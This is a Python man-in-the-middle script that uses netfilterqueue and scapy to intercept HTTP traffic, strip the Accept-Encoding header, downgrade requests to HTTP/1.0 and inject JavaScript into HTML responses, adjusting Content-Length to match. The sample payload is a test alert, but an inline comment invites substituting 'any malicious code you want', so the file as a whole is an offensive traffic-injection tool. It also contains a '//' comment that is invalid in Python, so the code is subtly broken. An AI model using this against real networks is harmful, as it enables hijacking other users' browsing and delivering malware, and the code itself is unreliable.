#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
	packet[scapy.Raw].load = load 
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
	
def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load
		try:
			if scapy_packet[scapy.TCP].dport == 10000:
				print("[+] Request")
				load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
				load = load.replace("HTTP/1.1", "HTTP/1.0")
				
			elif scapy_packet[scapy.TCP].sport == 10000:
				print("[+] Response")
				injection_code = "<script>alert('test');</script>"   //You can change this javascript code with any malicious code you want.
				load = load.replace("</body>", injection_code + "</body>")
				content_length_search = re.search("(?:Content-Length: \s)(\d*)", load)
				if content_length_search and "text/html" in load:
					content_length = content_length_search.group(1)
					new_content_length = int(content_length) + len(injection_code)
					load = load.replace(content_length, str(new_content_length))
		except IndexError:
			pass
			
			
		if load != scapy_packet[scapy.Raw].load:
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))
			
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
